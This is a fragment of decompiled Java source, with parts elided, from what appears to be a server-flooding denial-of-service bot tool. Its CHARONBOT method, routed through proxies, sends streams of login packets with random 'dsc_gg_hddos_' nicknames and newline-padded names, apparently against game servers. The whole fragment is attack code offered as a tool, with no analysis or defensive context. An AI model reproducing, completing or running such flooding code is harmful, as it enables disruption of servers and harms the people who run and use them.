...
public class CHARONBOT implements Method {
   ...
   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      ...
      try {
         ByteBuf var10001 = Unpooled.buffer();
         SecureRandom var10004 = new SecureRandom();
         channel.writeAndFlush(var10001.writeBytes((new LoginRequest(String.valueOf("dsc_gg_hddos_" + var10004.nextInt(9999)))).getWrappedPacket()));
         SecureRandom var10000 = new SecureRandom();
         String nick = "dsc_gg_hddos_" + var10000.nextInt(9999);
         ...
         for(var9 = 0; var9 < this.handshake.getWrappedPacket().length; ++var9) {
            var10001 = Unpooled.buffer();
            var10004 = new SecureRandom();
            channel.writeAndFlush(var10001.writeBytes((new LoginRequest(var10004.nextInt(9) + "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")).getWrappedPacket()));
            bbbb.write(var9);
         }
